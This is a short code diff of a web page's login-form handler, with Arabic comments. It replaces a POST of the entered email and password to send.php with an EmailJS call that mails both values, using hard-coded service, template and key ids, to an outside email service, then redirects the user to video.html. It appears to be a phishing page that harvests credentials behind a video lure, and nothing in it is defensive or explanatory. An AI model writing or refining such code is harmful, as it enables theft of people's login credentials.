@@ -4,20 +4,14 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
 
-    // إرسال البيانات إلى `send.php`
-    fetch("send.php", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log("تم إرسال البيانات بنجاح:", data);
-        window.location.href = "video.html"; // تحويل المستخدم إلى الفيديو
-    })
-    .catch(error => {
-        console.error("حدث خطأ أثناء الإرسال:", error);
+    emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
+        email: email,
+        password: password
+    }, "T7T1mrIFK0cukkI5Jhhze")
+    .then(function(response) {
+        console.log("تم الإرسال بنجاح!", response.status, response.text);
+        window.location.href = "video.html";
+    }, function(error) {
+        console.log("فشل الإرسال:", error);
     });
 });
